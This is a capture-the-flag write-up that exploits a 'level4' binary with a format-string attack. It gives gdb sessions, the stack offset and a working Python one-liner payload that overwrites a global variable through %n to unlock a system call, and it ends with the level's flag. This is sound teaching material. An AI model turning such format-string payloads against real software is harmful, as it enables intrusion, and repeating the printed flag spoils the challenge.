scp -P 4242 level4@192.168.56.103:/home/user/level4/level4 /home/zouz/Desktop/level4

function main call n() that call a fgets() then call a printf in another function called p() then, back in n(), a comparison is done on the m value like in level 3 to access a system call that will print our flag. It's a format string attack again we have to execute.

0x0804848d      mov eax, dword [m] ; 0x8049810
0x08048492      cmp eax, 0x1025544

0x1025544 is the address of the value of m 
we need to know the offset of the overflow

```
(gdb) r <<< $(python -c "print 'A' * 20 + '%x ' * 20")
Starting program: /home/user/level4/level4 <<< $(python -c'print "A" * 20 + "%x " * 20')
AAAAAAAAAAAAAAAAAAAAb7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141 41414141 41414141 41414141 41414141 25207825 78252078 20782520 25207825

```

it's 12, and if you print the hexadecimal value at the address of m, it matches with the overflow offset

```
(gdb) r <<< $(python -c "print '\x10\x98\x04\x08' + '%12\$x'")
Starting program: /home/user/level4/level4 <<< $(python -c "print '\x10\x98\x04\x08' + '%12\$x'")
8049810
```

Then it's the same technique than level 3 but with a different formatter.
0x1025544 = 16930116
we'll have to add 16930112 because of the mention of the redirection address before which takes 4 bits then add the offset

%[n]d =>  minimum width of n spaces, which, by default, will be right-justified

```
(gdb) r <<< $(python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"')
...
 -1208015184
/bin/cat: /home/user/level5/.pass: Permission denied
```

in a terminal :
$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4

unlock the system call and here is the flag :
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a